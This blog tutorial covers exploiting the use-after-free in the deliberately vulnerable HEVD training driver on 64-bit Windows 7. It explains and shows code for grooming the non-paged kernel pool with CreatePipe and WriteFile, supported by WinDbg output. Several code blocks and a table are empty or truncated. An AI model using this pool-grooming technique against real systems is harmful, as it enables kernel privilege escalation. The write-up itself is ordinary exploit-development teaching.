title: Windows Kernel Exploitation - Exploiting HEVD x64 Use-After-Free using Generic Non-Paged Pool Feng-Shui

---

# Introduction
There are many awesome tutorials and solutions on exploiting HEVD [[1]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) use-after-free for Windows 7 32-bit. All the solutions used IO Completion Reserve Objects to groom the kernel pool [[2]](https://github.com/sam-b/HackSysDriverExploits/blob/master/HackSysUseAfterFree/HackSysUseAfterFree/HackSysUseAfterFree.cpp) [[3]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/UseAfterFree.c) [[4]](https://github.com/theevilbit/exploits/blob/master/HEVD/hacksysUAF.py) [[5]](https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win7%20x86/HEVD_UAF.py) [[6]](http://www.fuzzysecurity.com/tutorials/expDev/19.html) [[7]](https://github.com/tekwizz123/HEVD-Exploit-Solutions/blob/master/HEVD-UaF-Exploit/HEVD-UaF-Exploit/HEVD-UaF-Exploit.cpp). But, most of the systems nowadays run 64-bit version of Windows. So, it might be interesting to find out how one can exploit UAF for a 64-bit vulnerable driver in Windows.

**P.S.**: If you have already tried to develop an exploit for HEVD use-after-free then you can consider directly skipping to the section Generic Non-Paged Kernel Pool Feng-Shui

# HEVD Use-after-free
After playing around with HEVD and triggerring the UAF, it was observed that the size of the freed pool chunk was 0x58. This chunk size is suitable for exploitation in 32-bit Windows. Now, let's look at the most popular way of performing non-paged kernel-pool feng-shui for exploiting pool corruption in Windows 7 32-bit. The most used method to spray kernel pool are Windows Kernel Objects[[8]](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx) [[9]](http://doar-e.github.io/blog/2014/03/11/first-dip-into-the-kernel-pool-ms10-058/) [[10]](http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf). Let's take a look at the chunk sizes for various Kernel Objects for Windows 7 32-bit. I borrowed code from [[11]](https://samdb.xyz/windows-kernel-exploitation-part-4/) and added some more code, to explore sizes for few more Kernel Objects.

![Image showing non-paged pool object sizes]({{site.baseurl}}/images/image-1501911765443.png)

The size for each Kernel object can be found using Windbg as following:

```

```

The following table indicates object sizes for many kernel objects

Kernel Object   |   Size
-------------   |   ----
IoCompletionReserve |   0x60
Event | 0x40
Semaphore | 0x48
Mutant | 0x50
Job | 0x168
File | 0xB8
Timer | 0xC8
Thread | 0x2E8

**Table 1** - *Kernel Object Sizes for Windows 7 32-bit*

It can be seen above, each object allocated a fixed sized chunk in non-paged pool, out of which IOCompletionReserve object has the size 0x60. As mentioned earlier, the size of the HEVD freed pool chunk was 0x58, so the IOCompletionReserve object is suitable to groom the kernel pool for exploiting HEVD use-after-free. Now, let's compile HEVD for Windows 7 64-bit [[12]](https://sizzop.github.io/2016/07/05/kernel-hacking-with-hevd-part-1.html) and trigger use-after-free.

![Image of UAF object allocation](/images/image-1502092885604.png)

The above screenshot shows the allocation of *UaF* object. There are 2 notable differences here, from 32-bit.

1. The pool chunk size is 0x60 (excluding header). Even though the size allocated for the buffer was 0x58, Windows memory manager appends some padding bytes to make it 0x60. In other words, the pool allocation granularity for 64-bit Windows is 0x10 bytes.

2. The header size is 0x10 instead of 0x8

![Image of UAF object free](/images/image-1502099308236.png)

Both the above screenshots shows that the size of the vulnerable *UaF* pool chunk is 0x70, so we need to find a suitable object which allocates the same chunk size in non-paged pool. Now we will take the same approach as taken for 32-bit and execute our program to allocate and determine Kernel Object sizes for Windows 7 64-bit.

The following table indicates size of various Kernel Objects for Windows 7 64-bit

Thread | 0x500

**Table 2** - *Kernel Object Sizes for Windows 7 64-bit*

You can see that the no objects allocate 0x70 sized pool chunk, hence none of them are suitable for grooming the kernel pool. All the object sizes are equal or more than 0x80. Then we went to check other API's which can create more Kernel Objects and encountered CreatePipe API. We quickly included CreatePipe in our code and checked if the size of the Kernel Object allocated due to CreatePipe is suitable for us.

```

To our disappointment we found that the CreateFile API in fact creates a File Kernel Object, similar to CreatFile API, so in its current form CreatePipe is also not useful for us. So, we can conclude that though the technique of allocating Kernel Objects is very popular for grooming non-paged kernel pool, but it lacks flexibility when we want to control the size of the pool chunk being allocated.

As the source is available for HEVD, we could have easily modified the size of the freed pool chunk to match the object size of one of the Windows Kernel objects, and recompiled the driver. But, in real life we don't have the leverage of doing that, because if we have a vulnerability, the size of the chunk required to exploit it can vary, and may not match any of the Kernel Object sizes. So, in this scenario we need a technique which can fulfill the following requirements:

1. Ability to allocate pool chunk in non-paged pool
2. Ability to control the size of the allocated pool chunk
3. Ability to control the contents of the allocated chunk
4. Ability to free the allocated pool chunk
5. Ability to perform the above things from userspace indirectly


# Generic Non-Paged Kernel Pool Feng-Shui
At first we thought that we have hit a roadblock, but then we stumbled upon a blogpost by Alex Ionescu [[13]](http://www.alex-ionescu.com/?p=231).

## Standing on the shoulder of the giants
First let's discuss briefly about the technique explained by Alex for the sake of completeness, as the whole idea is borrowed from his technique. In his case, the goal was to allocate shellcode, and then leak the base address of the shellcode, so that later we can jump to it to escalate our privileges. Now, if the allocation can be done in kernel-mode address space, then one don't have to worry about bypassing SMEP. So, CreatePipe and WriteFile was used to allocate chunks in non-paged pool, and the size of the buffer for the pipe is chosen in such a way, that it will be allocated in the **large pool**. Later, the starting address of the **large pool** was leaked using **NtQuerySystemInformation** API, and later a look-up was performed for the previously allocated chunk by matching its pool type, tag and size. Now, let's see how we can adapt this technique for our purposes.

## Controlled allocations in Non-Paged Pool

```cpp
// Source: http://www.alex-ionescu.com/?p=231
// Non-paged pool feng-shui using CreatePipe() and WriteFile()
// Allocation of arbitrary size chunks in Non-Paged Pool
// Look for allocation tag 'NpFr'
// Use PoolMonX to confirm chunk allocation of desired size

#include <Windows.h>
#include <stdio.h>

#define ALLOC_SIZE   0x70					// Adjust this value to get chunk allocations of desired length
#define BUFSIZE      (ALLOC_SIZE - 0x48)	// Calculating buffer size to allocate chunks of given length

int main()
{
	UCHAR payLoad[BUFSIZE];
	BOOL res = FALSE;
	HANDLE readPipe = NULL;
	HANDLE writePipe = NULL;
	DWORD resultLength;

	// Write the data in user space buffer
	RtlFillMemory(payLoad, BUFSIZE, 0x41);

	// Creating the pipe to kernel space
	res = CreatePipe(
		&readPipe,
		&writePipe,
		NULL,
		sizeof(payLoad));
	
	if (res == FALSE)
	{
		printf("[!] Failed creating Pipe\r\n");
		goto Cleanup;
	}
	else
	{
		printf("\r\n[+] Pipe Created successfully!\r\n");
		printf("\t[+] Read Pipe: 0x%x\r\n", readPipe);
		printf("\t[+] Write Pipe: 0x%x\r\n", writePipe);
	}
```
The size and contents of the allocated pool chunk will depend on the **payLoad** variable. **ALLOC_SIZE** represents the size of pool chunk we want to allocate. We need to  calculate correct **BUFFER_SIZE** by subtracting 0x48 (header size). We are initializing contents of the **payLoad** buffer using **RtlFillMemory()** API. When we create a pipe using **CreatePipe()** API, it returns 2 handles - read pipe and write pipe. 

![Image of NpFr 0 allocations](/images/image-1502106936728.png)

Now, we will use an amazing tool, named PoolMonX [[14]](https://github.com/zodiacon/PoolMonX) by Pavel Yosifovich to track the pool allocations. The pool tag of our interest here is **'NpFr'**. Initially, we can see above, that there are no allocations corresponding to the tag **'NpFr'**

```cpp	
	// Write data into the kernel space buffer from user space buffer
	// The following API call will trigger allocation in non-paged pool
	res = FALSE;
	res = WriteFile(
	writePipe,
	payLoad,
	sizeof(payLoad),
	&resultLength,
	NULL);

	if (res == FALSE)
	{
		printf("[!] Failed writing to Pipe\r\n");
		goto Cleanup;
	}
	else
	{
		printf("[+] Size Allocated due to write: 0x%x\r\n", resultLength);
		printf("[+] Written to file, successfully!\r\n\r\n");
	}
```

The above code uses **WriteFile()** API to write the data in the **payLoad** to the previously created pipe, using the write handle.

![Image of NpFr allocations](/images/image-1502107400984.png)

As soon as we write the data to the pipe, we can see that there is an allocation corresponding to the **'NpFr'** tag. We can also observe that the size corresponding to **'NpFr'** allocation is 112, which is 0x70 in hex. So, indeed we were successful in allocating a non-paged pool chunk of our desired size. 

```cpp
	Cleanup:
	CloseHandle(writePipe);
	CloseHandle(readPipe);
	printf("Read and Write Pipe closed\r\n");

	return 0;
}
```

The above code closes the previously opened pipe's read and write handle.

![Image of NpFr freed allocations](/images/image-1502107720986.png)

Now, we can see that the previously allocated pool chunk for tag **'NpFr'** of size 0x70 has been freed, and the number of allocated pool chunks for **'NpFr '** is again 0. Now, we can confirm that we can easily control the allocation and deallocation of pool chunk of size 0x70 in non-paged using **CreatePipe()** and **WriteFile()**. 

## Non-Paged Kernel Pool Defragmentation
Now we can modify the above code to perform defragmentation of the non-paged kernel pool for size 0x70. First, let's state of the pool before defragmentation spray.

```
kd> !poolused 2 NpFr

TOTAL         0            0          0            0
```
We can see that there are no pool chunks allocated in non-paged pool, corresponding to **'NpFr'** tag. Now we will execute the spray code and check the kernel pool again.

```
kd> !poolused 2 NpFr

 Sorting by NonPaged Pool Consumed

               NonPaged                  Paged

TOTAL     12288      1376256          0            0
```

We can see lots of **DATA_ENTRY** records allocated in non-paged pool.

## Grooming Non-Paged Kernel Pool
Now, we will go ahead and perform the allocation part of the grooming phase.

```
 kd> !poolused 2 NpFr
.

               NonPaged                  Paged

 NpFr     17664      1978368          0            0    DATA_ENTRY records (read/write buffers) , Binary: npfs.sys

TOTAL     17664      1978368          0            0
```

We can dump the address of all the **DATA_ENTRY** records pool chunks as follows:

```
kd> !poolfind NpFr -nonpaged

```

The size in the above output is 0x60 because **!poolfind** command does not add the pool header size.

The above dump shows that all the allocations are properly aligned in the kernel pool memory. Now, we will try to create lot of holes in the pool, so that the vulnerable **UaF** object falls into one of these holes.

```

TOTAL     14976      1677312          0            0
```

After deallocation we can see that the number of pool chunks corresponding to **'NpFr'** has reduced, but still we need to check whether we could get the kernel pool in the desired state.

The above dump confirms that the grooming has been successful, and we successfully created several holes between allocations. From this point onwards, exploiting HEVD UaF is straightforward and is similar to the x86 version. We just need to do some changes in the shellcode for Windows 7 x64 and we should be good to go.

Here is the mandatory screenshot showing successful exploitation of HEVD UAF in Windows 7 SP-1 64-bit.
